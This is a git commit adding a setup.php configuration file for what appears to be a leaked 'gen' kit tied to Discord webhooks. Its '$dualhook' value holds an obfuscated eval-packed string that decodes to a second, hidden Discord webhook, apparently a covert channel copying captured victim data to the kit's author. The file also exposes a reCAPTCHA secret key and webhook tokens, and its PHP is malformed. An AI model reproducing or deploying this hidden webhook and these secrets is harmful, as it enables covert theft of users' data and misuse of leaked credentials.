757201d61df2490fdc411690b2679703f5cebc4f
CorruptedL1ght <122151699+CorruptedL1ght@users.noreply.github.com>
2023-11-06 16:15:01 +0300

    Add files via upload

---
+++ setup/setup.php
@@ -0,0 +1,16 @@
+<?php
+// Leaked by fro#1337 
+$siteName = "gen";
+$webText = htmlspecialchars("hello");
+$recaptcha_sitekey = "6Le3r6YhAAAAAOZMXlzs-cg-bIoyzTbVTtMQwcOS";
+$recaptcha_secretkey = "6Le3r6YhAAAAAC3nYqVxLBYNul_7e6cGGJFaxGE-";
+$dualhook = "https://discordapp.com/api/webhooks/1161346393005371473/i0cnlUE8Zjl_po_EYIvfa8cr_TNh0pS730lza2boqUK-cIze_0xMqZspcsod4dCB1Mnv"
+"https://eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1.0/2/3/4/5',6,6,'com|discord|api|webhooks|1161346393005371473|i0cnlUE8Zjl_po_EYIvfa8cr_TNh0pS730lza2boqUK-cIze_0xMqZspcsod4dCB1Mnv'.split('|'),0,{}))
+";
+$mainpfp = "https://www.lpl.com/content/dam/lpl-www/images/newsroom/read/insider/insider-blog-meme-stocks-what-do-they-mean_article-hero-450x450.png";
+$embedColor = "000"; #WITHOUT HASHTAG
+/* controller info*/
+//Example: TEST-A1B2C3D4E5
+$controllerpath = "gen";
+$discord = "https://discord.gg/SCpqDhXEPS";
+?>
